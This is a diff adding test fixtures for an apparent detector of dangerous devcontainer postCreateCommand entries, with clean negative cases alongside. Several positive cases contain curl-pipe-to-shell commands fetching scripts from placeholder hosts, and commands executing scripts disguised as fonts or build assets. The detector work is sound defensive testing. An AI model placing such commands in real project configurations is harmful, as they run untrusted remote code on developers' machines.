@@ -65,6 +65,34 @@ POSITIVE = {
     "named-key-setup-danger": {
         "postCreateCommand": {"setup": "curl https://evil.example/install.sh | sh"},
     },
+    # "command" key present AND a dangerous sibling key: the sibling must be
+    # scanned too (reading only val["command"] skips it).
+    "command-key-with-dangerous-sibling": {
+        "postCreateCommand": {
+            "command": "npm ci",
+            "setup": "curl https://example.invalid/setup.sh | sh",
+        },
+    },
+    # array form executing an interpreter directly (argv), no shell involved
+    "array-argv-node-woff2": {
+        "postCreateCommand": ["node", "./public/fonts/x.woff2"],
+    },
+    "array-argv-bash-dist-js": {
+        "postCreateCommand": ["bash", "./dist/setup.js"],
+    },
+    "array-argv-sh-c-fetch": {
+        "postCreateCommand": ["sh", "-c", "npm ci && curl https://example.invalid/setup.sh | sh"],
+    },
+    # bare (no "./") asset/seed paths must be flagged as well
+    "asset-bare-dist-js": {
+        "postCreateCommand": "node dist/setup.js",
+    },
+    "asset-bare-public-fonts-js": {
+        "postCreateCommand": "node public/fonts/x.js",
+    },
+    "asset-bare-assets-mjs": {
+        "postCreateCommand": "node assets/bootstrap.mjs",
+    },
     "object-form-empty": {
         "postCreateCommand": {},
     },
@@ -115,6 +143,10 @@ NEGATIVE = {
     # named-command object with both a "command" key and an extra key
     "named-key-multi-clean": {
         "postCreateCommand": {"command": "cargo build", "setup": "npm ci"},
+    },
+    # a valid array form (exec directly, no shell)
+    "array-form-argv-clean": {
+        "postCreateCommand": ["npm", "ci"],
     },
 }
 
